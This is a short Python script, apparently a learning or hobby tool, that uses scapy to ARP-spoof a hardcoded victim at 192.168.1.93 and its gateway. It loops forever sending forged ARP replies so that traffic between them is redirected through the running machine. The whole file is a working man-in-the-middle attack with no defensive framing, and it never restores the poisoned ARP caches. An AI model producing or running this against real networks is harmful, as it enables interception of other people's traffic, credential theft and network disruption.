import scapy.all as scapy 
import time
import sys

def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)

target_ip = "192.168.1.93"
gateway_ip = "192.168.1.1"
target_mac = "c8:e2:65:63:8d:05"
gateway_mac = "cc:d4:a1:e9:89:de"

sent_packet_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip, target_mac)
        spoof(gateway_ip, target_ip, gateway_mac)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packets sent: " + str(sent_packet_count)),
        time.sleep(2)

except KeyboardInterrupt:
        print("[+] Cerrando ARP SPOOF")